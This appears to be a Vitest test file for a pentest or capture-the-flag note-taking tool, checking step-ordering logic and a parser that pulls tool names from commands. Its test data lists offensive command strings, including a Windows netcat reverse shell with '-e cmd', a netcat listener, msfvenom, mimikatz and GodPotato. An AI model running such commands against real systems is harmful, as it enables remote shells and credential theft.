import { describe, expect, it } from 'vitest'
import { currentStepId, toolOf } from './steps'
import type { Step } from './types'

const s = (id: number, position: number, done: boolean, dead = false): Step =>
  ({ id, boxId: 1, hostId: null, phase: 'Recon', position, body: '', done, saw: '', think: '', tried: '', got: '', dead })

describe('currentStepId', () => {
  it('first step not done, by position, not array order', () => {
    expect(currentStepId([s(3, 2, false), s(1, 0, true), s(2, 1, false)])).toBe(2)
  })
  it('unticking an earlier step moves you back to it', () => {
    expect(currentStepId([s(1, 0, false), s(2, 1, true), s(3, 2, false)])).toBe(1)
  })
  it('all done gives last by position', () => {
    expect(currentStepId([s(2, 1, true), s(1, 0, true)])).toBe(2)
  })
  it('no steps gives null', () => {
    expect(currentStepId([])).toBeNull()
  })
  it('currentStepId skips dead steps', () => {
    expect(currentStepId([s(1, 0, true), s(2, 1, false, true), s(3, 2, false)])).toBe(3)
    expect(currentStepId([s(1, 0, true), s(2, 1, false, true)])).toBe(2)
    expect(currentStepId([])).toBeNull()
  })
})

describe('toolOf', () => {
  it.each([
    ['sudo nmap -sC 10.0.0.1', 'nmap'],
    ['LHOST=1.2.3.4 msfvenom -p x', 'msfvenom'],
    ['/usr/bin/nc -lvnp 4444', 'nc'],
    ['python3 -m http.server 80', 'python3'],
    ['  ', ''],
    ['echo x | base64', 'echo'],
    ['.\\mimikatz.exe "privilege::debug"', 'mimikatz'],
    ['C:\\Windows\\Temp\\nc.exe 10.0.0.1 4444 -e cmd', 'nc'],
    ['GodPotato-NET4.exe -cmd x', 'GodPotato-NET4'],
  ])('%s -> %s', (cmd, tool) => { expect(toolOf(cmd)).toBe(tool) })
})
